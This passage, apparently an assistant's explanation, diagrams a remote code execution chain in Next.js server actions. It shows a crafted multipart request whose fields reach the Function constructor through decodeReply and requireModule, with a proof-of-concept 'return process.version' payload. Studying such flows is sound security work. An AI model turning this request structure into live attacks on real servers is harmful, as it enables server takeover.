 Here's how it ties together:

  The Complete Attack Flow

  ┌─────────────────────────────────────────────────────────────┐
  │                    ATTACKER REQUEST                         │
  │  POST /api/action                                           │
  │  Content-Type: multipart/form-data                          │
  │                                                             │
  │  Fields:                                                    │
  │    0: "$F1"                     ← Main argument             │
  │    1: {id: "...#constructor", bound: "$@2"}                 │
  │    2: ["return process.version"]                            │
  └─────────────────────────────────────────────────────────────┘
                             │
                             ▼
  ┌─────────────────────────────────────────────────────────────┐
  │                   NEXT.JS SERVER                            │
  │                                                             │
  │  1. decodeAction() - identifies which action to call        │
  │     └─ May or may not be exploitable directly               │
  │                                                             │
  │  2. decodeReply() - parses the ARGUMENTS  ← VULNERABLE!     │
  │     └─ $F1 triggers getOutlinedModel()                      │
  │     └─ Loads chunk 1: {id: "...#constructor", bound}        │
  │     └─ loadServerReference$1(id, bound)                     │
  │     └─ requireModule() accesses ["constructor"]             │
  │     └─ Returns Function constructor!                        │
  │     └─ Function.bind(null, "return process.version")        │
  │                                                             │
  │  3. Execute returned function                               │
  │     └─ Function("return process.version")()                 │
  │     └─ RCE ACHIEVED                                         │
  └─────────────────────────────────────────────────────────────┘
